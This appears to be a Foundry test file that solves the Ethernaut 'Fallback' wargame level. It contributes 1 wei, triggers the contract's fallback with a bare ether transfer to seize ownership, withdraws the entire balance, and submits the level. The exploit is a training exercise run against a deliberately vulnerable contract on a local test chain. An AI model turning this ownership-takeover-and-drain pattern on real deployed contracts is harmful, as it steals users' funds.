// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1-Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        // Level setup
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //
        // Level attack
        //

        // contribute 1 wei to have contributions > 0
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.getContribution(), 1 wei);

        // send eth with no calldata to trigger fallback and become owner
        (bool success, ) = payable(address(ethernautFallback)).call{value: 1 wei}("");
        assertTrue(success);
        assertEq(ethernautFallback.owner(), eoaAddress);

        // withdraw all eth
        emit log_named_uint("Fallback contract balance pre withdraw", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        uint newBalance = address(ethernautFallback).balance;
        emit log_named_uint("Fallback contract balance post withdraw", newBalance);
        assertEq(newBalance, 0);

        //
        // Level submission
        //
        
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
